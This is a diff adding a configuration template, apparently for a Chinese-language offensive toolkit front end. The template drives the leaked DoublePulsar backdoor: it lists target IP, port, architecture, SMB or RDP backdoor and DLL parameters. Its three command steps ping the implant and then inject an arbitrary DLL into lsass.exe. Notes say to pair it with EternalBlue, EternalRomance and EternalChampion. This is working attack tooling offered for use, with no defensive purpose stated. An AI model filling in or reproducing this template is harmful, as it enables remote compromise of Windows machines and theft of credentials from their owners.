@@ -1,0 +1,27 @@
+<sfjt>inject</sfjt>
+<cs1mc>IP地址</cs1mc>
+<cs2mc>端口</cs2mc>
+<cs3mc>系统架构</cs3mc>
+<cs4mc>后门注入服务</cs4mc>
+<cs5mc>DLL</cs5mc>
+<zbz>3</zbz>
+<bz1><cmd>Doublepulsar-1.3.1.exe --TargetIp <cs1/> --TargetPort <cs2/> --Function Ping --NetworkTimeout 60</cmd></bz1>
+<bz2><cmd>Doublepulsar-1.3.1.exe --TargetIp <cs1/> --TargetPort <cs2/> --Function Ping --NetworkTimeout 60</cmd></bz2>
+<bz3><cmd>Doublepulsar-1.3.1.exe --TargetIp <cs1/> --TargetPort <cs2/> --DllPayload <cs5/> --DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol <cs4/> --Architecture <cs3/> --Function Rundll --NetworkTimeout 60</cmd></bz3>
+<bz>*Doublepulsar --脉冲双星*
+[*] 配合永恒之蓝、永恒浪漫、永恒冠军使用
+[+] 配置参考FB武器库配置
+[+] DLL为注入的dll路径
+
+系统架构：
+X86
+ 32位
+X64
+ 64位
+
+后门注入服务：
+SMB
+ Ring 0 SMB (TCP 445) backdoor
+RDP
+ Ring 0 RDP (TCP 3389) backdoor
+</bz>
